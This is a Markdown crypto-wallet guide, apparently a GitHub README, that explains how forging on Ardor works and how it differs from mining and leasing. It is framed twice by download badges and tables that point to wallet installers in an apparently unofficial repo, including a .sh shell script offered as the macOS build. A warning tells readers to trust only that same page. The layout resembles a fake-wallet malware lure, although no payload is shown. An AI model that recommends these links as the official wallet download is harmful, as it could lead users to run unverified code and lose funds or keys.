![Ardor Wallet guide](assets/banner-article.png)

# What forging means on Ardor, and why it is not mining

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Forging is how Ardor produces blocks. An account holding enough ARDR, with a node online and following the chain, is eligible to forge a block and collect the transaction fees inside it. There is no mining, no proof-of-work race and no block reward: forging earns fees, not new coins.

## What forging is

Every blockchain needs somebody to order transactions into blocks. Bitcoin does it with a computational race; Ardor does it by weighted random selection among accounts that hold the network's token. The selected [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) assembles the next block, signs it, and passes it to its peers.

Because selection is weighted by stake rather than by horsepower, the resource that matters is the balance, not the hardware. A modest machine with enough [ARDR](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-ardor-token-does.md) competes on the same terms as a large one with the same balance, and the electricity cost of competing is close to the cost of running any always-on node.

## Why it is not mining

Mining is a guessing competition: many machines spend electricity to find a number, and the winner is paid newly created coins. Forging is a lottery with weighted tickets, and the payout is the [Ardor fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md)s that were already paid by users.

| | Mining | Forging on Ardor |
|---|---|---|
| Resource | Computation and electricity | Stake, held for a period |
| Reward | Newly issued coins plus fees | Fees only |
| Supply effect | Inflationary by design | Supply is fixed |
| Hardware race | Constant | None |

That last row is the practical difference. A miner's equipment becomes obsolete; a forger's eligibility does not depend on how fast the machine is.

## What a forger needs

Four conditions, all of them necessary.

- Enough ARDR to reach the minimum effective balance, held for the required period before it counts.
- A node that follows the chain, which means a full client rather than a light client.
- The account unlocked for forging in the wallet, and the wallet left running.
- A connection that stays up, because a node that is offline cannot produce a block.

The effective balance is the key concept. It is not the same as the balance in the account: it is the amount that counts towards forging after the holding period, and it is what you can [lease](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/lease-ardr-without-a-node-in-ardor-wallet.md) to somebody else. Confusing the two produces most of the complaints about forging that never starts.

## How a block gets forged

1. The node watches the chain and waits for its turn in the weighted selection.
2. When selected, it collects pending transactions into a block.
3. It signs the block with the account's key.
4. It publishes the block to peers, who validate and accept it.
5. The fees from those transactions are credited to the forging account.

Nothing in that sequence needs a mining pool, and nothing needs a transfer of coins to anybody. That is why the scam warning on this subject is so blunt: a lease moves forging power, and no legitimate forging arrangement ever asks you to send funds.

## Why the fees exist at all

A fee is the price of space in a block. Blocks are finite, so demand for inclusion has to be rationed by something; on Ardor it is rationed by price, and the price is paid to whoever produces the block. That is the whole economic loop, and it is why forging income tracks network use rather than the calendar.

It also explains why a fee can be computed rather than guessed. The wallet can estimate a current figure because the network is pricing a resource, not collecting a toll set by a company.

## What forging means for the network

Forging is the network's only source of new blocks, so the set of active forgers is the network's liveness. If every node were switched off, the chain would stop, and no amount of held ARDR would restart it until somebody ran a node again.

That is worth stating because it reframes what a forger is doing. They are not earning a passive yield from a balance; they are operating infrastructure that other people depend on, and being paid the fees those people chose to spend. A forger who goes offline is not merely missing income - they are removing capacity the network was using.

## Forging versus leasing

Not everyone wants a machine running all day. Leasing lets an account hand its forging power to another account for a fixed period while keeping full control of the coins. The recipient forges with the combined weight, and the two parties arrange any sharing between themselves.

A lease does not transfer ownership, cannot be changed until it expires, and takes effect after a delay. Those three properties are what make it safe to use with an operator you trust, and what make it useless as a way to move funds quickly - which is also why a request to send coins to a pool operator is never part of a lease.

## FAQ

### Do I earn new coins by forging?

No. Payment is the transaction fees attached to a block a forger produces, and the supply never grows to fund it.

### Can I forge with a light client?

No. Forging needs a node that follows the chain and can produce a block, which a light client does not do.

### How much ARDR do I need?

Enough to reach the minimum effective balance, held for the required period. The exact requirement and the holding time are covered in the forging setup guide.

### Is forging the same as staking?

The two words describe similar ideas, but Ardor's mechanism pays fees rather than an issuance reward, and it has no advertised yield. Calling it staking invites expectations the protocol does not meet.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Start forging ARDR in the wallet, and why it may not start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/start-forging-in-the-ardor-wallet.md)
- [Lease ARDR and earn fees without running a node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/lease-ardr-without-a-node-in-ardor-wallet.md)
- [What forgers actually earn, and what they do not](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forgers-actually-earn.md)
- [How Ardor uses proof of stake, and its trade-offs](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/how-ardor-uses-proof-of-stake.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
